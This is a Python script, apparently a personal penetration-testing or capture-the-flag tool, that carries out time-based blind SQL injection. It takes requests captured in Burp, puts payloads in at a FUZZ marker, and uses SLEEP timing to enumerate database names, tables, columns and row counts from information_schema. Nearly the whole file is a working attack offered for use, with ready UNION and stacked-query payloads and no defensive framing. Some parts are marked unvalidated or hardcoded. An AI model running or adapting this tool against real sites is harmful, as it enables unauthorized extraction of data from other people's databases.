#!/bin/python3

import Burpee.burpee as burpee
import requests
import string
import time
from enum import Enum
import re
import argparse

class Type(Enum):
    BLIND = 1
    ERROR = 2


#  parse args
parser = argparse.ArgumentParser(description='python testsqli.py -u url -r request.req -w wordlist')
parser.add_argument('-u', '--url', default='', required=True)
parser.add_argument('-r', '--request', required=True)
args = parser.parse_args()
args.url = re.sub('/*$', '', args.url)  # strip trailing / on url



# ## TMP
# args = {}
# args['url'] = 'http://192.168.69.63:450/'
# args['request'] = 'login.req'
# ## END TMP


# parse burp .req
headers , post_data = burpee.parse_request(args.request)
method_name , resource_name = burpee.get_method_and_resource(args.request)



# get databases

# get tables (specify database)

# get num rows 

# get columns (sepcify database + table)

# LIKE BINARY "%" 


waitTime = .2
proxies = {}


def replace_injection_params(obj, payload):
    for key in obj.keys():
        obj[key] = obj[key].replace('FUZZ', payload)
    return obj


def check(sqli):
    modified_resource_name = resource_name.replace('FUZZ', sqli)
    modified_headers = replace_injection_params(headers, sqli)
    modified_post_data = post_data.replace('FUZZ', sqli)

    if method_name.lower() == "get":
        resp = requests.get(url = args.url + modified_resource_name , headers = modified_headers , proxies = proxies , verify = False)
    elif method_name.lower() == "post":
        resp = requests.post(url = args.url + modified_resource_name, headers = modified_headers , data = modified_post_data , proxies = proxies , verify = False)


    if (resp.elapsed.total_seconds() > waitTime):
        return True
    else:
        return False


def getNumRows(table):
    dictionary = "0123456789"
    match_bases = []
    for x in dictionary: 
        match_bases.insert(0, x.replace('_', '\_'))

    while match_bases:
        base = match_bases.pop() 
        for x in dictionary:
            matchStr = base + x.replace('_', '\_')
            print(matchStr)

            # check exact
            sqli = ';SELECT IF((SELECT COUNT(*) FROM {}) = "{}", SLEEP({}), SLEEP(0))'.format(table, matchStr, waitTime)
            if check(sqli):
                print("Found {} rows in table: {}".format(matchStr, table))
                return matchStr
                            
            # match like
            sqli = ';SELECT IF((SELECT COUNT(*) FROM {}) LIKE "{}%", SLEEP({}), SLEEP(0))'.format(table, matchStr, waitTime)
            if check(sqli):
                match_bases.append(matchStr)



def getDatabases():
    databases = []
    #dictionary = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_ !$*+,-./:;<=>?@^{|}~"
    dictionary = "abcdefghijklmnopqrstuvwxyz_0123456789"
    
    match_bases = []
    for x in dictionary: 
        match_bases.insert(0, x.replace('_', '\_'))

    match_bases = ['b']

    while match_bases:
        base = match_bases.pop() 
        for x in dictionary:
            matchStr = base + x.replace('_', '\_')
            print(matchStr)

            # check exact
            sqli = '\' UNION SELECT IF((SELECT COUNT(table_schema) FROM information_schema.tables WHERE table_schema LIKE "{}")>0, SLEEP({}), SLEEP(0))'.format(matchStr, waitTime)
            if check(sqli):
                print("Found database: {}".format(matchStr))
                databases.append(matchStr)
                            
            # match like
            sqli = '\' UNION SELECT IF((SELECT COUNT(table_schema) FROM information_schema.tables WHERE table_schema LIKE "{}%")>0, SLEEP({}), SLEEP(0))'.format(matchStr, waitTime)
            if check(sqli):
                print('fount match: ' + matchStr)
                match_bases.append(matchStr)
        print('found databases')
        print(databases)
    return databases


## TO VALIDATE
def getTables(database):
    tables = []
    #dictionary = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_ !$*+,-./:;<=>?@^{|}~"
    dictionary = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_"
    
    match_bases = []
    for x in dictionary: 
        match_bases.insert(0, x.replace('_', '\_'))
    
    match_bases = ['p', 'P', 'u', 'U']

    while match_bases:
        base = match_bases.pop() 
        for x in dictionary:
            matchStr = base + x.replace('_', '\_')
            print(matchStr)

            # check exact
            sqli = ';SELECT IF((SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema = "{}" AND table_name LIKE BINARY "{}")>0, SLEEP({}), SLEEP(0))'.format(database, matchStr, waitTime)
            if check(sqli):
                print("Found EXACT table: {}".format(matchStr))
                tables.append(matchStr)
                            
            # match like
            sqli = ';SELECT IF((SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema = "{}" AND table_name LIKE BINARY "{}%")>0, SLEEP({}), SLEEP(0))'.format(database, matchStr, waitTime)
            if check(sqli):
                match_bases.append(matchStr)
        print('found tables')
        print(tables)
    return tables

def getColumns(database, table):
    columns = []
    #dictionary = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_ !$*+,-./:;<=>?@^{|}~"
    dictionary = "abcdefghijklmnopqrstuvwxyz0123456789_"
    
    match_bases = []
    for x in dictionary: 
        match_bases.insert(0, x.replace('_', '\_'))

    # match_bases = ['u', 'p']

    while match_bases:
        base = match_bases.pop() 
        for x in dictionary:
            matchStr = base + x.replace('_', '\_')
            print(matchStr)

            # check exact
            sqli = ';SELECT IF((SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema = "{}" AND table_name = "{}" AND column_name LIKE "{}")>0, SLEEP({}), SLEEP(0))'.format(database, table, matchStr, waitTime)
            if check(sqli):
                print("Found EXACT column: {}".format(matchStr))
                columns.append(matchStr)
                            
            # match like
            sqli = ';SELECT IF((SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema = "{}" AND table_name = "{}" AND column_name LIKE "{}%")>0, SLEEP({}), SLEEP(0))'.format(database, table, matchStr, waitTime)
            if check(sqli):
                match_bases.append(matchStr)
        print('found columns')
        print(columns)
    return columns



#NOTE: table name is case sensitive


#### GET DATABASES
getDatabases()


#### GET NUM ROWS
# getNumRows('18')


#### GET TABLES
# getTables('%')


#### GET COLUMNS
# getColumns('zm', '18')
